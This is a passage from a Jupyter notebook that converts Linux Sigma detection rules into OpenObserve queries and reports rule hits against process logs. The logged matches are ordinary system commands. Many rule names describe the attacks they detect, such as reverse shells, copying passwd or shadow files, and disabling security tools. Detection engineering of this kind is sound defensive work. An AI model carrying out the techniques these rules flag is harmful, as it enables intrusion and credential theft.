            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_base64_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_shell_script_exec_from_susp_location.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_shell_script_exec_from_susp_location.yml\n",
            "=> Processing rule file proc_creation_lnx_bpf_kprob_tracing_enabled.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_bpf_kprob_tracing_enabled.yml\n",
            "=> Processing rule file proc_creation_lnx_esxcli_system_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_system_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_nohup_susp_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_nohup_susp_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_system_network_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_system_network_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_base64_decode.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_base64_decode.yml\n",
            "=> Processing rule file proc_creation_lnx_esxcli_vm_kill.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_kill.yml\n",
            "=> Processing rule file proc_creation_lnx_env_shell_invocation.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_env_shell_invocation.yml\n",
            "=> Processing rule file proc_creation_lnx_perl_reverse_shell.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_perl_reverse_shell.yml\n",
            "=> Processing rule file proc_creation_lnx_triple_cross_rootkit_execve_hijack.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_triple_cross_rootkit_execve_hijack.yml\n",
            "=> Processing rule file proc_creation_lnx_apt_shell_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_apt_shell_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_esxcli_permission_change_admin.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_permission_change_admin.yml\n",
            "=> Processing rule file proc_creation_lnx_crontab_enumeration.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_crontab_enumeration.yml\n",
            "=> Processing rule file proc_creation_lnx_setgid_setuid.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_setgid_setuid.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_git_clone.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_git_clone.yml\n",
            "=> Processing rule file proc_creation_lnx_awk_shell_spawn.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_awk_shell_spawn.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_interactive_bash.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_interactive_bash.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_pipe_shell.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml\n",
            "=> Processing rule file proc_creation_lnx_ssh_shell_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_ssh_shell_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_find_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_find_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_iptables_flush_ufw.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_iptables_flush_ufw.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_curl_useragent.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_curl_useragent.yml\n",
            "=> Processing rule file proc_creation_lnx_mkfifo_named_pipe_creation_susp_location.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_mkfifo_named_pipe_creation_susp_location.yml\n",
            "=> Processing rule file proc_creation_lnx_mount_hidepid.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_mount_hidepid.yml\n",
            "=> Processing rule file proc_creation_lnx_cve_2022_26134_atlassian_confluence.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_cve_2022_26134_atlassian_confluence.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_sensitive_file_access.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_sensitive_file_access.yml\n",
            "=> Processing rule file proc_creation_lnx_esxcli_vm_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_recon_indicators.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_recon_indicators.yml\n",
            "=> Processing rule file proc_creation_lnx_git_shell_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_git_shell_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_cp_passwd_or_shadow_tmp.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_shell_child_process_from_parent_tmp_folder.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_shell_child_process_from_parent_tmp_folder.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_network_utilities_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_network_utilities_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_doas_execution.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_doas_execution.yml\n",
            "=> Processing rule file proc_creation_lnx_system_network_connections_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_system_network_connections_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_omigod_scx_runasprovider_executescript.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_omigod_scx_runasprovider_executescript.yml\n",
            "=> Processing rule file proc_creation_lnx_triple_cross_rootkit_install.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_triple_cross_rootkit_install.yml\n",
            "=> Processing rule file proc_creation_lnx_local_account.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_local_account.yml\n",
            "=> Processing rule file proc_creation_lnx_susp_java_children.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_susp_java_children.yml\n",
            "=> Processing rule file proc_creation_lnx_cve_2022_33891_spark_shell_command_injection.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_cve_2022_33891_spark_shell_command_injection.yml\n",
            "=> Processing rule file proc_creation_lnx_chattr_immutable_removal.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_chattr_immutable_removal.yml\n",
            "=> Processing rule file proc_creation_lnx_remote_system_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_remote_system_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_rsync_shell_spawn.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_rsync_shell_spawn.yml\n",
            "=> Processing rule file proc_creation_lnx_php_reverse_shell.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_php_reverse_shell.yml\n",
            "=> Processing rule file proc_creation_lnx_local_groups.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_local_groups.yml\n",
            "=> Processing rule file proc_creation_lnx_security_tools_disabling.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_security_tools_disabling.yml\n",
            "=> Processing rule file proc_creation_lnx_crontab_removal.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_crontab_removal.yml\n",
            "=> Processing rule file proc_creation_lnx_omigod_scx_runasprovider_executeshellcommand.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_omigod_scx_runasprovider_executeshellcommand.yml\n",
            "=> Processing rule file proc_creation_lnx_esxcli_vsan_discovery.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_vsan_discovery.yml\n",
            "=> Processing rule file proc_creation_lnx_remove_package.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_remove_package.yml\n",
            "=> Processing rule file proc_creation_lnx_clipboard_collection.yml:\n",
            " => Reading rule file /home/user/tmp/others/sigma/rules/linux/process_creation/proc_creation_lnx_clipboard_collection.yml\n"
          ]
        }
      ],
      "source": [
        "(df_res2, df_stats2) = convert_rulesdir(\n",
        "    openobserve_prov, rulesdir, table_name, openobserve_backend, stats=True\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 39,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T21:04:39.438232Z",
          "iopub.status.busy": "2025-07-06T21:04:39.437941Z",
          "iopub.status.idle": "2025-07-06T21:04:39.468140Z",
          "shell.execute_reply": "2025-07-06T21:04:39.467442Z",
          "shell.execute_reply.started": "2025-07-06T21:04:39.438210Z"
        }
      },
      "outputs": [
        {
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>rule</th>\n",
              "      <th>empty</th>\n",
              "      <th>errors</th>\n",
              "      <th>hits</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>proc_creation_lnx_malware_gobrat_grep_payload_...</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>proc_creation_lnx_touch_susp.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>proc_creation_lnx_file_and_directory_discovery...</td>\n",
              "      <td>False</td>\n",
              "      <td>False</td>\n",
              "      <td>1000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>proc_creation_lnx_ssm_agent_abuse.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>proc_creation_lnx_base64_shebang_cli.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>...</th>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>108</th>\n",
              "      <td>proc_creation_lnx_crontab_removal.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>109</th>\n",
              "      <td>proc_creation_lnx_omigod_scx_runasprovider_exe...</td>\n",
              "      <td>False</td>\n",
              "      <td>True</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>110</th>\n",
              "      <td>proc_creation_lnx_esxcli_vsan_discovery.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>111</th>\n",
              "      <td>proc_creation_lnx_remove_package.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>112</th>\n",
              "      <td>proc_creation_lnx_clipboard_collection.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "<p>113 rows \u00d7 4 columns</p>\n",
              "</div>"
            ],
            "text/plain": [
              "                                                  rule  empty  errors  hits\n",
              "0    proc_creation_lnx_malware_gobrat_grep_payload_...   True   False     0\n",
              "1                     proc_creation_lnx_touch_susp.yml   True   False     0\n",
              "2    proc_creation_lnx_file_and_directory_discovery...  False   False  1000\n",
              "3                proc_creation_lnx_ssm_agent_abuse.yml   True   False     0\n",
              "4             proc_creation_lnx_base64_shebang_cli.yml   True   False     0\n",
              "..                                                 ...    ...     ...   ...\n",
              "108              proc_creation_lnx_crontab_removal.yml   True   False     0\n",
              "109  proc_creation_lnx_omigod_scx_runasprovider_exe...  False    True     0\n",
              "110        proc_creation_lnx_esxcli_vsan_discovery.yml   True   False     0\n",
              "111               proc_creation_lnx_remove_package.yml   True   False     0\n",
              "112         proc_creation_lnx_clipboard_collection.yml   True   False     0\n",
              "\n",
              "[113 rows x 4 columns]"
            ]
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "df_res2"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 40,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T21:04:39.470501Z",
          "iopub.status.busy": "2025-07-06T21:04:39.470276Z",
          "iopub.status.idle": "2025-07-06T21:04:39.483668Z",
          "shell.execute_reply": "2025-07-06T21:04:39.482559Z",
          "shell.execute_reply.started": "2025-07-06T21:04:39.470480Z"
        }
      },
      "outputs": [
        {
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>rule</th>\n",
              "      <th>empty</th>\n",
              "      <th>errors</th>\n",
              "      <th>hits</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>proc_creation_lnx_malware_gobrat_grep_payload_...</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>proc_creation_lnx_touch_susp.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>proc_creation_lnx_ssm_agent_abuse.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>proc_creation_lnx_base64_shebang_cli.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>proc_creation_lnx_sudo_cve_2019_14287.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>...</th>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>107</th>\n",
              "      <td>proc_creation_lnx_security_tools_disabling.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>108</th>\n",
              "      <td>proc_creation_lnx_crontab_removal.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>110</th>\n",
              "      <td>proc_creation_lnx_esxcli_vsan_discovery.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>111</th>\n",
              "      <td>proc_creation_lnx_remove_package.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>112</th>\n",
              "      <td>proc_creation_lnx_clipboard_collection.yml</td>\n",
              "      <td>True</td>\n",
              "      <td>False</td>\n",
              "      <td>0</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "<p>87 rows \u00d7 4 columns</p>\n",
              "</div>"
            ],
            "text/plain": [
              "                                                  rule  empty  errors  hits\n",
              "0    proc_creation_lnx_malware_gobrat_grep_payload_...   True   False     0\n",
              "1                     proc_creation_lnx_touch_susp.yml   True   False     0\n",
              "3                proc_creation_lnx_ssm_agent_abuse.yml   True   False     0\n",
              "4             proc_creation_lnx_base64_shebang_cli.yml   True   False     0\n",
              "5            proc_creation_lnx_sudo_cve_2019_14287.yml   True   False     0\n",
              "..                                                 ...    ...     ...   ...\n",
              "107     proc_creation_lnx_security_tools_disabling.yml   True   False     0\n",
              "108              proc_creation_lnx_crontab_removal.yml   True   False     0\n",
              "110        proc_creation_lnx_esxcli_vsan_discovery.yml   True   False     0\n",
              "111               proc_creation_lnx_remove_package.yml   True   False     0\n",
              "112         proc_creation_lnx_clipboard_collection.yml   True   False     0\n",
              "\n",
              "[87 rows x 4 columns]"
            ]
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "df_res2[df_res2[\"empty\"] & ~df_res2[\"errors\"]]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 41,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T21:04:39.486232Z",
          "iopub.status.busy": "2025-07-06T21:04:39.485908Z",
          "iopub.status.idle": "2025-07-06T21:04:39.504981Z",
          "shell.execute_reply": "2025-07-06T21:04:39.504480Z",
          "shell.execute_reply.started": "2025-07-06T21:04:39.486208Z"
        }
      },
      "outputs": [
        {
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>count_</th>\n",
              "      <th>data_command_line</th>\n",
              "      <th>data_exe_path</th>\n",
              "      <th>info_event_name</th>\n",
              "      <th>info_parent_task_name</th>\n",
              "      <th>info_task_name</th>\n",
              "      <th>os_type</th>\n",
              "      <th>rule</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>1009</td>\n",
              "      <td>find -O3 /var/lib/php/sessions/ -ignore_readdi...</td>\n",
              "      <td>/usr/bin/find</td>\n",
              "      <td>execve</td>\n",
              "      <td>sessionclean</td>\n",
              "      <td>find</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_file_and_directory_discovery...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>1009</td>\n",
              "      <td>find /usr/lib/php -mindepth 1 -maxdepth 1 -reg...</td>\n",
              "      <td>/usr/bin/find</td>\n",
              "      <td>execve</td>\n",
              "      <td>phpquery</td>\n",
              "      <td>find</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_file_and_directory_discovery...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>193</td>\n",
              "      <td>find /proc/233/fd -ignore_readdir_race -lname ...</td>\n",
              "      <td>/usr/bin/find</td>\n",
              "      <td>execve</td>\n",
              "      <td>sessionclean</td>\n",
              "      <td>find</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_file_and_directory_discovery...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>188</td>\n",
              "      <td>find /proc/231/fd -ignore_readdir_race -lname ...</td>\n",
              "      <td>/usr/bin/find</td>\n",
              "      <td>execve</td>\n",
              "      <td>sessionclean</td>\n",
              "      <td>find</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_file_and_directory_discovery...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>158</td>\n",
              "      <td>find /etc/apt/trusted.gpg.d -mindepth 1 -maxde...</td>\n",
              "      <td>/usr/bin/find</td>\n",
              "      <td>execve</td>\n",
              "      <td>apt-key</td>\n",
              "      <td>find</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_file_and_directory_discovery...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>...</th>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>304</td>\n",
              "      <td>id -u</td>\n",
              "      <td>/usr/bin/id</td>\n",
              "      <td>execve</td>\n",
              "      <td>occ</td>\n",
              "      <td>id</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_local_account.yml</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>58</td>\n",
              "      <td>id -u</td>\n",
              "      <td>/usr/bin/id</td>\n",
              "      <td>execve</td>\n",
              "      <td>91-release-upgr</td>\n",
              "      <td>id</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_local_account.yml</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>58</td>\n",
              "      <td>id -u</td>\n",
              "      <td>/usr/bin/id</td>\n",
              "      <td>execve</td>\n",
              "      <td>update-motd-fsc</td>\n",
              "      <td>id</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_local_account.yml</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>56</td>\n",
              "      <td>id -u</td>\n",
              "      <td>/usr/bin/id</td>\n",
              "      <td>execve</td>\n",
              "      <td>sh</td>\n",
              "      <td>id</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_local_account.yml</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>32</td>\n",
              "      <td>id -u</td>\n",
              "      <td>/usr/bin/id</td>\n",
              "      <td>execve</td>\n",
              "      <td>lighttpd</td>\n",
              "      <td>id</td>\n",
              "      <td>linux</td>\n",
              "      <td>proc_creation_lnx_local_account.yml</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "<p>63 rows \u00d7 8 columns</p>\n",
              "</div>"
            ],
            "text/plain": [
              "    count_                                  data_command_line  data_exe_path  \\\n",
              "0     1009  find -O3 /var/lib/php/sessions/ -ignore_readdi...  /usr/bin/find   \n",
              "1     1009  find /usr/lib/php -mindepth 1 -maxdepth 1 -reg...  /usr/bin/find   \n",
              "2      193  find /proc/233/fd -ignore_readdir_race -lname ...  /usr/bin/find   \n",
              "3      188  find /proc/231/fd -ignore_readdir_race -lname ...  /usr/bin/find   \n",
              "4      158  find /etc/apt/trusted.gpg.d -mindepth 1 -maxde...  /usr/bin/find   \n",
              "..     ...                                                ...            ...   \n",
              "0      304                                              id -u    /usr/bin/id   \n",
              "1       58                                              id -u    /usr/bin/id   \n",
              "2       58                                              id -u    /usr/bin/id   \n",
              "3       56                                              id -u    /usr/bin/id   \n",
              "4       32                                              id -u    /usr/bin/id   \n",
              "\n",
              "   info_event_name info_parent_task_name info_task_name os_type  \\\n",
              "0           execve          sessionclean           find   linux   \n",
              "1           execve              phpquery           find   linux   \n",
              "2           execve          sessionclean           find   linux   \n",
              "3           execve          sessionclean           find   linux   \n",
              "4           execve               apt-key           find   linux   \n",
              "..             ...                   ...            ...     ...   \n",
              "0           execve                   occ             id   linux   \n",
              "1           execve       91-release-upgr             id   linux   \n",
              "2           execve       update-motd-fsc             id   linux   \n",
              "3           execve                    sh             id   linux   \n",
              "4           execve              lighttpd             id   linux   \n",
              "\n",
              "                                                 rule  \n",
              "0   proc_creation_lnx_file_and_directory_discovery...  \n",
              "1   proc_creation_lnx_file_and_directory_discovery...  \n",
              "2   proc_creation_lnx_file_and_directory_discovery...  \n",
              "3   proc_creation_lnx_file_and_directory_discovery...  \n",
              "4   proc_creation_lnx_file_and_directory_discovery...  \n",
              "..                                                ...  \n",
              "0                 proc_creation_lnx_local_account.yml  \n",
              "1                 proc_creation_lnx_local_account.yml  \n",
              "2                 proc_creation_lnx_local_account.yml  \n",
              "3                 proc_creation_lnx_local_account.yml  \n",
              "4                 proc_creation_lnx_local_account.yml  \n",
              "\n",
              "[63 rows x 8 columns]"
            ]
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "df_stats2"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Sigma rule to alerts"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 42,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T21:04:39.507107Z",
          "iopub.status.busy": "2025-07-06T21:04:39.505945Z",
          "iopub.status.idle": "2025-07-06T21:04:39.523946Z",
          "shell.execute_reply": "2025-07-06T21:04:39.523567Z",
          "shell.execute_reply.started": "2025-07-06T21:04:39.507087Z"
        }
      },
      "outputs": [
        {
          "data": {
            "text/plain": [
              "['/home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_crypto_mining_indicators.yml',\n",
              " '/home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml',\n",
              " '/home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_domain_localtonet_tunnel.yml',\n",
              " '/home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_susp_malware_callback_port.yml',\n",
              " '/home/user/tmp/others/sigma/rules/linux/network_connection/net_connection_lnx_ngrok_tunnel.yml']"
            ]
          },
          "execution_count": 1,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "res_to_alerts = [\n",
        "    base_rulesdir + \"/network_connection/\" + item\n",
        "    for item in df_res1[df_res1[\"empty\"] & ~df_res1[\"errors\"]][\"rule\"].tolist()\n",
        "]\n",
        "# res_to_alerts += [base_rulesdir + \"/file_event/\" + item for item in df_res2[df_res2[\"empty\"] & ~df_res2[\"errors\"]]['rule'].tolist()]\n",
        "res_to_alerts"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 43,
      "metadata": {
        "execution": {
          "iopub.execute_input": "2025-07-06T21:04:39.524462Z",
          "iopub.status.busy": "2025-07-06T21:04:39.524317Z",
          "iopub.status.idle": "2025-07-06T21:04:39.539566Z",
          "shell.execute_reply": "2025-07-06T21:04:39.537335Z",
          "shell.execute_reply.started": "2025-07-06T21:04:39.524448Z"
        }
      },
      "outputs": [],
      "source": [
        "# SELECT * FROM \"kunai\" WHERE data_exe_path LIKE '%/doas'\n",
        "# res_to_alerts = [\n",
        "#     os.environ[\"HOME\"]\n",
        "#     + \"/tmp/sigma/rules/linux/process_creation/proc_creation_lnx_doas_execution.yml\"\n",
        "# ]\n",
